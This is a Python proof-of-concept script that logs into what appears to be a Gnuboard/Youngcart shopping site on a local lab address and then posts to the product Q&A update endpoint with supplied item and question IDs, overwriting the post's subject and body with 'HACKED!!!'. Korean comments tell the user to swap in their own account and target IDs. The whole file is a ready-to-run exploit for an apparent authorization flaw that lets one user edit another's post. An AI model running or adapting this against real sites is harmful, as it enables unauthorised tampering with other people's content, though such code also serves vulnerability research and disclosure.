import requests

def login(session, base_url, mb_id, mb_password):
    login_url = f"{base_url}/sir/bbs/login_check.php"
    login_data = {
        "url": "%2Fsir%2F",
        "mb_id": mb_id,
        "mb_password": mb_password
    }
    login_headers = {
        "Origin": base_url,
        "Referer": f"{base_url}/sir/",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ko-KR,ko;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    res = session.post(login_url, headers=login_headers, data=login_data)
    return res


def access_main(session, base_url):
    main_url = f"{base_url}/sir/"
    headers = {
        "Referer": f"{base_url}/sir/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    res = session.get(main_url, headers=headers)
    return res


def updateItemQA(session, base_url, it_id, iq_id, iq_email):
    updateQA_url = f"{base_url}/sir/shop/itemqaformupdate.php"
    updateQA_data = {
        "w": "u",
        "it_id": it_id,
        "iq_id": iq_id,
        "iq_email": iq_email,
        "iq_hp": '',
        "iq_subject": "HACKED!!!",
        "iq_question": "HACKED!!!"
    }
    updateQA_header = {
        "Origin": base_url,
        "Referer": f"{base_url}/sir/shop/itemqaform.php?it_id={it_id}&iq_id={iq_id}&w=u",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ko-KR,ko;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    
    res = session.post(updateQA_url, headers=updateQA_header, data=updateQA_data)
    return res




if __name__ == "__main__":
    base_url = "http://192.168.55.168"
    session = requests.Session()

    # 로그인 시도
    login_res = login(session, base_url, mb_id="test", mb_password="test1234") # 로그인 계정, id/pw 수정
    
    it_id = '1750573640' # 상품의 id, 자신에게 맞게 수정
    iq_id = '6' # 문의글 id, 자신에게 맞게 수정
    iq_email = 'test%40test.com' # 이메일, 자신에게 맞게 수정
    
    
    # 메인 페이지 접근
    main_res = access_main(session, base_url)
    
    # 업데이트 수행
    updateItemQA(session, base_url, it_id, iq_id, iq_email)
    
    print("업데이트 완료!!")